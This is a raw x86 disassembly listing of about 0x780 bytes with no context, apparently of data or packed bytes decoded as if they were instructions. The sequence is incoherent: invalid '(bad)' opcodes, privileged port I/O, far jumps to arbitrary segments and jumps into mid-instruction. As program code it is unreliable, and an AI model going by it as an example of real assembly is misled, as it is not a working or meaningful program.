  40d50c:	in     eax,0xb1
  40d50e:	jno    0x40d564
  40d510:	and    DWORD PTR [edx],ebp
  40d512:	cmc    
  40d513:	pop    ss
  40d514:	cmp    bl,cl
  40d516:	dec    ebp
  40d517:	sub    dh,cl
  40d519:	out    0xd4,al
  40d51b:	repz inc edx
  40d51d:	sbb    al,0x51
  40d51f:	sub    dh,bh
  40d521:	mov    ch,0xef
  40d523:	jmp    0xcffc:0x82b7a411
  40d52a:	mov    edx,0x1b67f7fc
  40d52f:	in     eax,dx
  40d530:	out    dx,al
  40d531:	ret    
  40d532:	jno    0x40d517
  40d534:	sbb    BYTE PTR [esi],cl
  40d536:	test   al,0x92
  40d538:	and    DWORD PTR [ecx+0x2c74128a],ebx
  40d53e:	lock and DWORD PTR [ebx+0x5d],esp
  40d542:	ss cmc 
  40d544:	ret    
  40d545:	dec    ecx
  40d546:	test   eax,0x56c2de7a
  40d54b:	xor    edi,DWORD PTR [edi+edx*8]
  40d54e:	pop    edi
  40d54f:	mov    ch,0x67
  40d551:	or     DWORD PTR [esi],esp
  40d553:	xor    dl,ch
  40d555:	mov    ebp,0xa5d60eee
  40d55a:	scas   eax,DWORD PTR es:[edi]
  40d55b:	pushf  
  40d55c:	fmul   QWORD PTR [edi-0xd0feead]
  40d562:	fst    DWORD PTR [edi-0x2d]
  40d565:	sub    BYTE PTR [ecx+0x25df3260],dl
  40d56b:	into   
  40d56c:	mov    ebp,0x5dfffcd1
  40d571:	mov    cs,WORD PTR [eax]
  40d573:	mov    ecx,0xfca7317d
  40d578:	adc    bl,dh
  40d57a:	shl    BYTE PTR [ecx-0x51de7928],cl
  40d580:	stos   DWORD PTR es:[edi],eax
  40d581:	test   DWORD PTR [ebp+esi*4+0x2b],ecx
  40d585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d586:	ins    DWORD PTR es:[edi],dx
  40d587:	jg     0x40d581
  40d589:	bound  edi,QWORD PTR [esi+0x17]
  40d58c:	add    bl,BYTE PTR [eax-0x1354d9c3]
  40d592:	(bad)  
  40d593:	inc    esi
  40d594:	shr    DWORD PTR [ebp-0x6fa853b1],1
  40d59a:	xor    eax,DWORD PTR ds:[edx+0x29]
  40d59e:	lea    esi,[esi-0x5f34cf0d]
  40d5a4:	test   DWORD PTR [edi],ebp
  40d5a6:	shl    BYTE PTR [edx+ebx*1-0x7851daec],0xed
  40d5ae:	xchg   edi,eax
  40d5af:	jg     0x40d54d
  40d5b1:	je     0x40d57e
  40d5b3:	xor    eax,0x8423aa7
  40d5b8:	ficomp DWORD PTR [ecx+0x2]
  40d5bb:	jge    0x40d579
  40d5bd:	pushf  
  40d5be:	sub    DWORD PTR [ebx+0x70d29d39],ecx
  40d5c4:	mov    edx,ebx
  40d5c6:	add    BYTE PTR [ebp-0x1c714ec7],bl
  40d5cc:	lods   eax,DWORD PTR ds:[esi]
  40d5cd:	lahf   
  40d5ce:	mov    eax,0x66d0c4a0
  40d5d3:	or     edx,eax
  40d5d5:	cdq    
  40d5d6:	adc    eax,0xb3244a3f
  40d5db:	ins    BYTE PTR es:[edi],dx
  40d5dc:	aam    0xea
  40d5de:	cmp    BYTE PTR [ebx-0x1b],bh
  40d5e1:	sti    
  40d5e2:	stos   DWORD PTR es:[edi],eax
  40d5e3:	mov    esi,0xf067c923
  40d5e8:	(bad)
  40d5ed:	ficom  DWORD PTR [edi+eiz*1-0x6858c921]
  40d5f4:	push   eax
  40d5f5:	mov    dl,0xf9
  40d5f7:	jecxz  0x40d5f2
  40d5f9:	mov    ah,0x90
  40d5fb:	je     0x40d5e2
  40d5fd:	repnz repnz mov BYTE PTR [ecx+0x4],0xb8
  40d603:	push   ebp
  40d604:	xor    al,0xd
  40d606:	sbb    BYTE PTR [ecx+edi*2+0x78],bh
  40d60a:	dec    ebp
  40d60b:	xor    edi,ebx
  40d60d:	loope  0x40d5aa
  40d60f:	(bad)  
  40d610:	imul   edx,DWORD PTR [edx-0x67],0x72
  40d614:	cmp    edi,DWORD PTR [edi-0x26]
  40d617:	dec    ecx
  40d618:	add    al,0xbe
  40d61a:	inc    ecx
  40d61b:	lods   al,BYTE PTR ds:[esi]
  40d61c:	test   eax,0xb680562b
  40d621:	or     edi,DWORD PTR [esi]
  40d623:	adc    esp,DWORD PTR [esi+0x491469fa]
  40d629:	sahf   
  40d62a:	das    
  40d62b:	out    dx,al
  40d62c:	cwde   
  40d62d:	jb     0x40d5dd
  40d62f:	lock push 0x3bf7a62c
  40d635:	xor    eax,0x31a4306b
  40d63a:	mov    dl,0xee
  40d63c:	or     dh,BYTE PTR [edi-0x39163762]
  40d642:	and    esi,DWORD PTR [esi-0x569a34d6]
  40d648:	xrelease xchg BYTE PTR [edx+0x2b27ee8c],bh
  40d64f:	icebp  
  40d650:	push   eax
  40d651:	jns    0x40d669
  40d653:	jmp    0x533d48c3
  40d658:	pop    ebx
  40d659:	shr    BYTE PTR cs:[edi+ebp*2-0x49],0x1f
  40d65f:	sub    eax,0xfa861e29
  40d664:	mov    esi,0x2a401f3d
  40d669:	dec    esp
  40d66a:	mov    edi,0x69e0c7b5
  40d66f:	jb     0x40d60b
  40d671:	add    DWORD PTR [esi+0x71],edx
  40d674:	ror    edi,0xe0
  40d677:	adc    DWORD PTR [eax+0x89068ac],ebx
  40d67d:	call   0xfd6d:0xef6945e9
  40d684:	xor    al,0xc1
  40d686:	mov    edi,0x2270082a
  40d68b:	pushf  
  40d68c:	out    0xd,al
  40d68e:	xchg   BYTE PTR ds:0xf6ce5c88,ah
  40d694:	mov    ecx,0x2c70f02d
  40d699:	outs   dx,DWORD PTR ds:[esi]
  40d69a:	cmp    bl,ah
  40d69c:	inc    ebp
  40d69d:	clc    
  40d69e:	xchg   DWORD PTR [edx-0x4c],ebp
  40d6a1:	or     BYTE PTR [esi],ch
  40d6a3:	sub    BYTE PTR [ecx],ch
  40d6a5:	xor    ch,BYTE PTR [edi-0x5edff513]
  40d6ab:	pop    es
  40d6ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ad:	or     eax,0xba9524ff
  40d6b2:	jg     0x40d6ba
  40d6b4:	lahf   
  40d6b5:	add    BYTE PTR [edx+eax*8-0x16bc013b],bh
  40d6bc:	scas   eax,DWORD PTR es:[edi]
  40d6bd:	mov    DWORD PTR [edi],edx
  40d6bf:	add    eax,0x21f87b4c
  40d6c4:	xor    ecx,DWORD PTR [eax+esi*1]
  40d6c7:	ror    DWORD PTR [ecx+0x7f],1
  40d6ca:	mov    al,ds:0x74844bf9
  40d6cf:	add    esi,edx
  40d6d1:	adc    DWORD PTR [ecx-0x10f70347],0xffffffb4
  40d6d8:	out    0xce,al
  40d6da:	ret    0xdd37
  40d6dd:	and    DWORD PTR [ebx],0x60
  40d6e0:	retf   
  40d6e1:	xor    edi,0x19
  40d6e4:	rcl    DWORD PTR ds:[ecx-0x6b],1
  40d6e8:	cmp    esi,DWORD PTR [edx]
  40d6ea:	jmp    0xb1c0:0x4425a11f
  40d6f1:	fstp   TBYTE PTR [ebx+eiz*2-0x682cc1f3]
  40d6f8:	clc    
  40d6f9:	and    edx,DWORD PTR [eax+ecx*1]
  40d6fc:	xchg   al,dh
  40d6fe:	sub    al,0x92
  40d700:	or     BYTE PTR [esi-0x4b6bef60],bh
  40d706:	leave  
  40d707:	cmp    esp,eax
  40d709:	xor    al,0x57
  40d70b:	add    DWORD PTR [ecx+0x3c],eax
  40d70e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d70f:	and    eax,0x431cb74b
  40d714:	xchg   BYTE PTR [ecx-0xebd2596],ch
  40d71a:	inc    eax
  40d71b:	dec    edi
  40d71c:	out    dx,eax
  40d71d:	fs iret 
  40d71f:	or     ebx,edi
  40d721:	test   al,0x67
  40d723:	sbb    BYTE PTR [esi-0x2d6e65b2],0x6e
  40d72a:	mov    esp,0xbef99687
  40d72f:	retf   0xc43
  40d732:	add    eax,0x971a7324
  40d737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d738:	sar    DWORD PTR [eax-0x6789afdb],cl
  40d73e:	dec    ebp
  40d73f:	in     al,0xe0
  40d741:	leave  
  40d742:	rol    DWORD PTR [edi],0xb6
  40d745:	lods   eax,DWORD PTR ds:[esi]
  40d746:	ret    0x3816
  40d749:	cmp    ah,BYTE PTR [ecx]
  40d74b:	in     al,dx
  40d74c:	shl    BYTE PTR [esp+edx*4-0x72e56467],cl
  40d753:	xor    al,0x64
  40d755:	xchg   esp,eax
  40d756:	xchg   esi,eax
  40d757:	adc    al,0x6a
  40d759:	mov    dh,0xf8
  40d75b:	cmp    ebx,DWORD PTR [edi-0x3e]
  40d75e:	push   ebp
  40d75f:	add    BYTE PTR [esi-0x43749a8e],dh
  40d765:	adc    al,BYTE PTR [ebx]
  40d767:	push   ebp
  40d768:	nop
  40d769:	cmp    DWORD PTR [ebp+0x33],edi
  40d76c:	and    eax,0xb2fdd6f
  40d771:	repnz and al,0x16
  40d774:	inc    eax
  40d775:	mov    cl,0xf0
  40d777:	and    al,0xbc
  40d779:	mov    al,0xb0
  40d77b:	repnz aam 0xc7
  40d77e:	and    cl,al
  40d780:	test   cl,0x26
  40d783:	inc    edi
  40d784:	je     0x40d7f0
  40d786:	scas   al,BYTE PTR es:[edi]
  40d787:	daa    
  40d788:	cmp    cl,ch
  40d78a:	std    
  40d78b:	push   0x84e3e1ef
  40d790:	xchg   esp,eax
  40d791:	inc    ebp
  40d792:	and    ah,dh
  40d794:	jns    0x40d71b
  40d796:	in     al,dx
  40d797:	add    dl,BYTE PTR [edi+0x41580fcf]
  40d79d:	xor    al,0x3
  40d79f:	mov    ebx,0x95a2d038
  40d7a4:	add    edi,DWORD PTR [ebp-0x24]
  40d7a7:	std    
  40d7a8:	(bad)  
  40d7aa:	ins    DWORD PTR es:[edi],dx
  40d7ab:	fwait
  40d7ac:	bound  ebp,QWORD PTR [ebx-0x510103e4]
  40d7b2:	js     0x40d7b9
  40d7b4:	cld    
  40d7b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7b6:	xchg   edi,eax
  40d7b7:	sub    esp,DWORD PTR [ebx+edx*1+0x3046adb3]
  40d7be:	das    
  40d7bf:	mov    al,ds:0x46b61758
  40d7c4:	adc    dl,BYTE PTR [ebp+0x60]
  40d7c7:	or     esi,eax
  40d7c9:	call   0x12d82af7
  40d7ce:	xchg   esi,eax
  40d7cf:	push   ebx
  40d7d0:	and    eax,0xcb212f61
  40d7d5:	sbb    BYTE PTR [ecx],dh
  40d7d7:	pcmpeqb mm4,QWORD PTR [ecx+0x455f38d0]
  40d7de:	loopne 0x40d7c3
  40d7e0:	mov    dl,0x1d
  40d7e2:	out    0xdf,eax
  40d7e4:	repz std 
  40d7e6:	push   0x54
  40d7e8:	fmul   QWORD PTR [ebx+0x565c60fe]
  40d7ee:	outs   dx,BYTE PTR ds:[esi]
  40d7ef:	sbb    BYTE PTR [eax+0x74ff3d19],cl
  40d7f5:	mov    cl,0x67
  40d7f7:	add    BYTE PTR [ecx],0x58
  40d7fa:	sbb    ecx,DWORD PTR [esi+0x4]
  40d7fd:	ret    0x4bf9
  40d800:	jno    0x40d78c
  40d802:	(bad)  
  40d803:	lods   al,BYTE PTR ds:[esi]
  40d804:	jb     0x40d80a
  40d806:	inc    DWORD PTR [edx-0x265c9e9e]
  40d80c:	mov    esp,0xcc00fef1
  40d811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d812:	inc    esp
  40d813:	das    
  40d814:	gs jmp 0x40d7b1
  40d817:	push   ds
  40d818:	outs   dx,DWORD PTR ds:[esi]
  40d819:	cmp    BYTE PTR [ebx+0x77e708e8],bh
  40d81f:	cld    
  40d820:	push   esi
  40d821:	mov    esp,0x7c8dfaab
  40d826:	adc    ebx,DWORD PTR [esi-0x61]
  40d829:	mov    ebx,0x6783cc5b
  40d82e:	outs   dx,DWORD PTR ds:[esi]
  40d82f:	adc    al,0xaa
  40d831:	test   BYTE PTR [ecx+0x2a],0x13
  40d835:	std    
  40d836:	dec    esp
  40d837:	dec    BYTE PTR [esi]
  40d839:	push   ebp
  40d83a:	push   0xd174e94c
  40d83f:	rcl    DWORD PTR [ecx+0x7c14dc3],1
  40d845:	(bad)  
  40d846:	imul   ecx,DWORD PTR [ebx-0x790211bd],0x23
  40d84d:	mov    DWORD PTR ds:0xfe99bde4,edx
  40d853:	jbe    0x40d804
  40d855:	aas    
  40d856:	and    eax,DWORD PTR [ebp-0x2f1b6803]
  40d85c:	mov    dh,0x89
  40d85e:	or     ch,BYTE PTR ds:0x2cfffa7f
  40d864:	je     0x40d8a1
  40d866:	in     eax,dx
  40d867:	mov    esi,0x46697dd6
  40d86c:	mov    fs,edx
  40d86e:	adc    eax,0x124712de
  40d873:	repnz cmp cl,BYTE PTR [ecx-0x7ae4ac0]
  40d87a:	pop    edx
  40d87b:	push   ecx
  40d87c:	dec    ebp
  40d87d:	jb     0x40d850
  40d87f:	mov    edx,0xd26b8210
  40d884:	inc    edi
  40d885:	xor    bh,0x52
  40d888:	jo     0x40d856
  40d88a:	jge    0x40d88f
  40d88c:	and    al,0xa0
  40d88e:	in     eax,0x69
  40d890:	sbb    esp,edi
  40d892:	test   al,0x6e
  40d894:	int    0x98
  40d896:	js     0x40d8a2
  40d898:	hlt    
  40d899:	push   ecx
  40d89a:	inc    eax
  40d89b:	xchg   ebx,eax
  40d89c:	imul   esi,DWORD PTR [ecx-0x30e0c8ba],0x279d59e3
  40d8a6:	cmc    
  40d8a7:	cli    
  40d8a8:	fisubr WORD PTR [ebp-0x74a14662]
  40d8ae:	xor    esp,edi
  40d8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8b1:	dec    ecx
  40d8b2:	mov    DWORD PTR [ebp+0x1fd366f],ecx
  40d8b8:	xor    DWORD PTR [edx],esp
  40d8ba:	pop    eax
  40d8bb:	mov    ?,WORD PTR [edx]
  40d8bd:	dec    edx
  40d8be:	mov    dh,0x94
  40d8c0:	std    
  40d8c1:	leave  
  40d8c2:	xor    esi,eax
  40d8c4:	cmp    DWORD PTR [esi-0xe1a486a],ebp
  40d8ca:	jnp    0x40d8c5
  40d8cc:	ins    DWORD PTR es:[edi],dx
  40d8cd:	mov    ch,0x2a
  40d8cf:	inc    edi
  40d8d0:	ins    DWORD PTR es:[edi],dx
  40d8d1:	mov    ebp,0xc27fe09a
  40d8d6:	mov    ?,WORD PTR [esp+ecx*1+0x278bb2e5]
  40d8dd:	mov    ds:0x2ebd1e65,eax
  40d8e2:	mov    DWORD PTR [ebx+0x302c6685],ecx
  40d8e8:	fwait
  40d8e9:	loop   0x40d961
  40d8eb:	jmp    0x1e39:0xeef96ab5
  40d8f2:	mov    DWORD PTR [edi-0x2e],ecx
  40d8f5:	(bad)  
  40d8f7:	int3   
  40d8f8:	xchg   esp,eax
  40d8f9:	xor    BYTE PTR [esi],ch
  40d8fb:	cwde   
  40d8fc:	retf   
  40d8fd:	stos   BYTE PTR es:[edi],al
  40d8fe:	xor    ah,BYTE PTR [ebx+0x752dd2a5]
  40d904:	xchg   esp,eax
  40d905:	int3   
  40d906:	cli    
  40d907:	push   ds
  40d908:	sbb    al,0xed
  40d90a:	repnz retf 
  40d90c:	add    al,0x7d
  40d90e:	outs   dx,BYTE PTR ds:[esi]
  40d90f:	add    esp,DWORD PTR [ebx-0x6085a40a]
  40d915:	jne    0x40d899
  40d917:	mov    edx,0x45af9543
  40d91c:	cmp    DWORD PTR [ebx*4-0x29e03d9f],esp
  40d923:	js     0x40d917
  40d925:	cmp    edx,DWORD PTR [ebx+0x48]
  40d928:	ror    BYTE PTR ds:0xef57d783,cl
  40d92e:	fsqrt  
  40d930:	cwde   
  40d931:	push   ss
  40d932:	mov    al,ds:0x6e207bc8
  40d937:	sti    
  40d938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d939:	mov    ecx,0xc8ebf92c
  40d93f:	bts    DWORD PTR [edi+eax*2+0x67],ecx
  40d944:	in     eax,0x37
  40d946:	pop    ecx
  40d947:	dec    esp
  40d948:	(bad)  
  40d949:	imul   edx,DWORD PTR [esi+esi*8],0xffffff81
  40d94d:	test   cl,bh
  40d94f:	fstp   TBYTE PTR [ebx]
  40d951:	xchg   BYTE PTR [ecx+0x7d],dl
  40d954:	and    edi,DWORD PTR [edx+0x35]
  40d957:	xchg   esi,eax
  40d958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d959:	in     al,0x2d
  40d95b:	bound  ecx,QWORD PTR [ecx]
  40d95d:	aaa    
  40d95e:	mul    esi
  40d960:	mov    eax,ds:0x56c6668a
  40d965:	out    0x80,eax
  40d967:	mov    al,ds:0x2341bf3e
  40d96c:	test   bl,ch
  40d96e:	inc    edx
  40d96f:	and    al,ah
  40d971:	push   edx
  40d972:	stos   BYTE PTR es:[edi],al
  40d973:	push   0x625d2c07
  40d978:	add    ebp,DWORD PTR [ebp+0x7d7a2a40]
  40d97e:	scas   al,BYTE PTR es:[edi]
  40d97f:	mov    dh,0xc
  40d981:	adc    esp,DWORD PTR ds:0x5e59d40a
  40d987:	pusha  
  40d988:	js     0x40d910
  40d98a:	stos   DWORD PTR es:[edi],eax
  40d98b:	aaa    
  40d98c:	xchg   ecx,eax
  40d98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d98e:	test   eax,0xf8376a89
  40d993:	es mov dh,0x61
  40d996:	mov    ah,0x32
  40d998:	lods   eax,DWORD PTR ds:[esi]
  40d999:	into   
  40d99a:	push   edx
  40d99b:	xlat   BYTE PTR ds:[ebx]
  40d99c:	sub    al,0xc2
  40d99e:	xor    al,0x1e
  40d9a0:	loope  0x40d962
  40d9a2:	xchg   esp,eax
  40d9a3:	repnz test BYTE PTR [ecx*1+0x27ebe53b],0xa
  40d9ac:	jle    0x40d94c
  40d9ae:	sub    eax,0x54d6338b
  40d9b3:	cmp    DWORD PTR [ebp-0x655193f8],edx
  40d9b9:	stos   BYTE PTR es:[edi],al
  40d9ba:	ror    DWORD PTR [edx-0x6b],1
  40d9bd:	mov    bl,0x67
  40d9bf:	push   ebx
  40d9c0:	(bad)  
  40d9c1:	shl    BYTE PTR [edx],1
  40d9c3:	jb     0x40d9b7
  40d9c5:	push   cs
  40d9c6:	cmp    DWORD PTR [ecx-0x2b],ebp
  40d9c9:	mov    ecx,0x91076320
  40d9ce:	fld    TBYTE PTR [ebp+0x666d8c44]
  40d9d4:	and    DWORD PTR [ecx],edx
  40d9d6:	jbe    0x40d9ff
  40d9d8:	cmp    dl,BYTE PTR [edx-0x19421d2c]
  40d9de:	inc    ebx
  40d9df:	jp     0x40da5e
  40d9e1:	ds sahf 
  40d9e3:	ins    DWORD PTR es:[edi],dx
  40d9e4:	jecxz  0x40d9a6
  40d9e6:	into   
  40d9e7:	pop    ecx
  40d9e8:	(bad)  
  40d9e9:	mov    edi,0xe26b5e9e
  40d9ee:	mov    esi,0x42d16ed6
  40d9f3:	pop    esp
  40d9f4:	mov    al,0xbb
  40d9f6:	cmc    
  40d9f7:	aam    0xcb
  40d9f9:	mov    ecx,DWORD PTR [edi+0x1d]
  40d9fc:	or     cl,dh
  40d9fe:	pop    ss
  40d9ff:	mov    dl,0xe0
  40da01:	pop    esp
  40da02:	imul   ecx,edi,0xd46c3d8e
  40da08:	cmp    eax,0x84ceeb3
  40da0d:	pop    ss
  40da0e:	clc    
  40da0f:	xchg   ebx,eax
  40da10:	mov    esp,0x373144ec
  40da15:	mov    bl,0xe2
  40da17:	dec    ebp
  40da18:	sbb    eax,0xf805ea6a
  40da1d:	(bad)  
  40da1e:	fucomip st,st(0)
  40da20:	xchg   ebx,eax
  40da21:	in     eax,0x12
  40da23:	sub    al,0xaa
  40da25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da26:	sbb    cl,BYTE PTR [edi-0x67]
  40da29:	jge    0x40d9f0
  40da2b:	outs   dx,DWORD PTR ds:[esi]
  40da2c:	loopne 0x40da17
  40da2e:	pop    edx
  40da2f:	hlt    
  40da30:	jnp    0x40d9b3
  40da32:	sub    al,0x40
  40da34:	scas   al,BYTE PTR es:[edi]
  40da35:	std    
  40da36:	out    0xa2,eax
  40da38:	sbb    al,0xea
  40da3a:	cmp    al,0xc0
  40da3c:	jmp    0x792a7c88
  40da41:	inc    ebp
  40da42:	add    al,0xdc
  40da44:	xchg   ecx,eax
  40da45:	mov    WORD PTR [ecx],?
  40da47:	sbb    cl,BYTE PTR [ebx]
  40da49:	fmul   st,st(1)
  40da4b:	xchg   ebx,eax
  40da4c:	cdq    
  40da4d:	and    DWORD PTR [edx-0x2b],ebp
  40da50:	nop
  40da51:	inc    edx
  40da52:	xor    ecx,eax
  40da54:	pusha  
  40da55:	addr16 add al,0x8f
  40da58:	jns    0x40da47
  40da5a:	mov    al,0xd1
  40da5c:	rol    ebx,1
  40da5e:	fist   WORD PTR [edi+edx*1]
  40da61:	add    DWORD PTR [ecx+0x7b],esp
  40da64:	mov    dh,dh
  40da66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da67:	daa    
  40da68:	push   ds
  40da69:	dec    esp
  40da6a:	or     al,0xc7
  40da6c:	inc    ecx
  40da6d:	jbe    0x40da10
  40da6f:	pop    ss
  40da70:	pusha  
  40da71:	mov    ds:0xf4765014,eax
  40da76:	cmp    edx,DWORD PTR [esi+ecx*8+0x1d]
  40da7a:	mov    ch,0xb
  40da7c:	pop    esp
  40da7d:	pop    esp
  40da7e:	(bad)  
  40da7f:	icebp  
  40da80:	sub    al,0x1a
  40da82:	pop    eax
  40da83:	test   dl,cl
  40da85:	int3   
  40da86:	scas   eax,DWORD PTR es:[edi]
  40da87:	jo     0x40da4a
  40da89:	xor    BYTE PTR [ebx+0x35cb532e],bh
  40da8f:	xchg   esi,eax
  40da90:	mov    bh,0x5
  40da92:	dec    ebp
  40da93:	mov    ebx,0xf53398d6
  40da98:	retf   
  40da99:	ds gs pop edx
  40da9c:	loop   0x40db1c
  40da9e:	mov    dh,0x5b
  40daa0:	test   al,0x1c
  40daa2:	mov    ah,0x5d
  40daa4:	popf   
  40daa5:	pop    ebx
  40daa6:	xor    DWORD PTR [eax-0x38cebbfa],esp
  40daac:	sti    
  40daad:	and    BYTE PTR [eax],0xea
  40dab0:	retf   0xd229
  40dab3:	popa   
  40dab4:	std    
  40dab5:	shr    DWORD PTR [ebp+0x4c],1
  40dab8:	retf   
  40dab9:	add    al,0x21
  40dabb:	nop
  40dabc:	out    0xd8,eax
  40dabe:	ds scas eax,DWORD PTR es:[edi]
  40dac0:	sbb    DWORD PTR [ebp-0x795ef2a9],ebp
  40dac6:	fcmovne st,st(0)
  40dac8:	and    eax,0xc7f30d39
  40dacd:	iret   
  40dace:	mov    bl,0xc2
  40dad0:	ret    
  40dad1:	rol    ah,0x7b
  40dad4:	out    dx,eax
  40dad5:	scas   eax,DWORD PTR es:[edi]
  40dad6:	xchg   ebp,eax
  40dad7:	adc    bl,BYTE PTR [edx-0x6938fe25]
  40dadd:	aad    0xc8
  40dadf:	add    BYTE PTR [edx+0x73],bh
  40dae2:	shr    eax,0x24
  40dae5:	xchg   esp,eax
  40dae6:	test   DWORD PTR [ebp-0x59],ecx
  40dae9:	add    DWORD PTR [ebp-0x33680626],ebx
  40daef:	in     eax,dx
  40daf0:	pop    esp
  40daf1:	inc    edx
  40daf2:	xor    BYTE PTR [ebx-0x4503a2b3],dl
  40daf8:	jle    0x40da90
  40dafa:	jns    0x40dabb
  40dafc:	lods   al,BYTE PTR ds:[esi]
  40dafd:	jnp    0x40db36
  40daff:	sbb    BYTE PTR [edi],0x3e
  40db02:	push   edx
  40db03:	push   cs
  40db04:	sti    
  40db05:	les    ecx,FWORD PTR [ecx]
  40db07:	jns    0x40dacf
  40db09:	xlat   BYTE PTR ds:[ebx]
  40db0a:	adc    eax,ecx
  40db0c:	arpl   WORD PTR [ebx],sp
  40db0e:	jp     0x40db63
  40db10:	mov    edx,0xc59a0e09
  40db15:	fldenv [ebp-0x39113510]
  40db1b:	cdq    
  40db1c:	push   ebp
  40db1d:	jl     0x40daf8
  40db1f:	pop    ebp
  40db20:	dec    esp
  40db21:	sub    al,0x39
  40db23:	pop    eax
  40db24:	clc    
  40db25:	fcom   QWORD PTR [ebp-0xc]
  40db28:	stc    
  40db29:	xchg   esp,eax
  40db2a:	cwde   
  40db2b:	xchg   ebx,eax
  40db2c:	aas    
  40db2d:	or     eax,0xfd10d568
  40db32:	xchg   ecx,eax
  40db33:	dec    edi
  40db34:	sbb    DWORD PTR [ebx-0x4ff6503e],eax
  40db3a:	adc    ah,BYTE PTR [edx-0x5ecace09]
  40db40:	into   
  40db41:	push   ss
  40db42:	popa   
  40db43:	mov    esi,0xda45052d
  40db48:	fs dec edx
  40db4a:	ror    DWORD PTR [ecx-0x19],0x90
  40db4e:	mov    ds:0x309db5e5,eax
  40db53:	mov    cl,0xe6
  40db55:	cs jae 0x40dae2
  40db58:	outs   dx,DWORD PTR ds:[esi]
  40db59:	adc    DWORD PTR [eax],0xffffffb7
  40db5c:	fcomp  QWORD PTR [edi-0x1328cd5f]
  40db62:	mov    edx,0xa58d2577
  40db67:	enter  0xce75,0x3e
  40db6b:	lea    edx,[esi-0xb660fec]
  40db71:	mov    ebx,0x7b2c0ce6
  40db76:	sub    edx,DWORD PTR [edx-0x52]
  40db79:	data16 sti 
  40db7b:	enter  0xfaa,0xb6
  40db7f:	and    al,0xae
  40db81:	shl    DWORD PTR [ecx-0x1b],1
  40db84:	or     edx,esp
  40db86:	mov    ch,BYTE PTR [esp+edx*4-0x161754f6]
  40db8d:	jg     0x40db4d
  40db8f:	and    al,0x3b
  40db91:	cmp    eax,0x6604d24b
  40db96:	scas   al,BYTE PTR es:[edi]
  40db97:	xchg   ebp,eax
  40db98:	fwait
  40db99:	cmc    
  40db9a:	add    DWORD PTR [eax-0x33],0xfb75450d
  40dba1:	xor    ebx,DWORD PTR [eax-0x17]
  40dba4:	jmp    0x3fb0:0x351fd16f
  40dbab:	fisubr WORD PTR [eax+eiz*8+0x46f7669]
  40dbb2:	jp     0x40db35
  40dbb4:	add    cl,ah
  40dbb6:	jp     0x40dc0f
  40dbb8:	(bad)  
  40dbb9:	xchg   ebx,eax
  40dbba:	cmp    BYTE PTR [ebx+0x235c57cd],al
  40dbc0:	dec    eax
  40dbc1:	dec    esp
  40dbc2:	sahf   
  40dbc3:	cmp    BYTE PTR [ecx+0x4299b7db],bh
  40dbc9:	mov    esi,0x8abad241
  40dbce:	out    0x1b,al
  40dbd0:	dec    ecx
  40dbd1:	clc    
  40dbd2:	mov    ah,ch
  40dbd4:	push   esi
  40dbd5:	ret    0xde42
  40dbd8:	ss cli 
  40dbda:	retf   0xec36
  40dbdd:	mov    eax,0xdf09b8d6
  40dbe2:	(bad)  
  40dbe3:	and    eax,0xe149b857
  40dbe8:	fisub  DWORD PTR [ecx]
  40dbea:	xchg   esi,eax
  40dbeb:	and    eax,ebp
  40dbed:	inc    ebp
  40dbee:	test   al,0x14
  40dbf0:	jp     0x40dba0
  40dbf2:	mov    ebp,0xb430f91f
  40dbf7:	ret    
  40dbf8:	push   ds
  40dbf9:	xor    bl,BYTE PTR [ebx]
  40dbfb:	fisub  DWORD PTR [ebx-0x57]
  40dbfe:	mov    ebx,0xccb64a60
  40dc03:	stos   DWORD PTR es:[edi],eax
  40dc04:	hlt    
  40dc05:	daa    
  40dc06:	nop
  40dc07:	out    0xe7,eax
  40dc09:	addr16 jae 0x40dc7f
  40dc0c:	cwde   
  40dc0d:	sub    DWORD PTR [eax],esp
  40dc0f:	mul    DWORD PTR [ebp+0xa1de09]
  40dc15:	push   cs
  40dc16:	ds aad 0xa3
  40dc19:	xor    al,BYTE PTR [eax]
  40dc1b:	jle    0x40dc64
  40dc1d:	pop    ebx
  40dc1e:	jb     0x40dc95
  40dc20:	push   ebp
  40dc21:	mov    dl,0xba
  40dc23:	outs   dx,BYTE PTR ds:[esi]
  40dc24:	jp     0x40dbde
  40dc26:	ins    DWORD PTR es:[edi],dx
  40dc27:	dec    esp
  40dc28:	inc    ebx
  40dc29:	push   edx
  40dc2a:	imul   edx,DWORD PTR [esi-0x42ae5796],0x4e30549a
  40dc34:	fst    st(7)
  40dc36:	aas    
  40dc37:	pushf  
  40dc38:	retf   0xdbbc
  40dc3b:	dec    esi
  40dc3c:	dec    ebx
  40dc3d:	in     eax,0xfa
  40dc3f:	mov    ds:0x8728d33b,eax
  40dc44:	in     al,0x54
  40dc46:	sbb    BYTE PTR [edx],ch
  40dc48:	js     0x40dc65
  40dc4a:	xchg   esi,eax
  40dc4b:	inc    ebp
  40dc4c:	mov    edx,0x6443bcf1
  40dc51:	dec    esp
  40dc52:	into   
  40dc53:	pop    DWORD PTR [ecx+0x16]
  40dc56:	jae    0x40dc32
  40dc58:	pop    edi
  40dc59:	jnp    0x40dcad
  40dc5b:	xchg   DWORD PTR [esi],ebx
  40dc5d:	scas   al,BYTE PTR es:[edi]
  40dc5e:	mov    ecx,0x57d8aded
  40dc63:	xchg   ecx,eax
  40dc64:	sti    
  40dc65:	and    ebp,DWORD PTR [edx-0x6e]
  40dc68:	retf   0x9ea1
  40dc6b:	sub    al,0x34
  40dc6d:	jg     0x40dc92
  40dc6f:	cmc    
  40dc70:	ror    edx,1
  40dc72:	lock jne 0x40dc86
  40dc75:	test   al,0x50
  40dc77:	fldenv [ecx-0x7ab667ac]
  40dc7d:	or     cl,dl
  40dc7f:	jecxz  0x40dcf0
  40dc81:	mov    al,0x33
  40dc83:	jmp    0xd531c85c
  40dc88:	pop    edx
  40dc89:	fbld   TBYTE PTR [edi+edi*4+0x1a]
